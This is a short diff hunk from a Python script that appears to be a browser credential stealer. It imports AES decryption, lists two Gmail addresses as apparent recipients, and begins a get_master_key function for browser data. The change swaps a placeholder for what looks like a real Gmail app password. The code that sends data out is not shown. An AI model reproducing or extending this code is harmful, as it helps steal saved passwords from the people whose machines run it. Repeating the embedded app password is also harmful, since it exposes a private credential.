@@ -13,7 +13,7 @@ from Crypto.Cipher import AES
 import base64
 
 EMAILS = ["c785727@gmail.com", "xboxblack638@gmail.com"]
-APP_PASS = "YOUR_GMAIL_APP_PASSWORD_HERE"  # Replace with real app password for c785727@gmail.com
+APP_PASS = "bhyloqvziwlhvekx"  # Replace with real app password for c785727@gmail.com
 
 def get_master_key(browser_base):
     try:
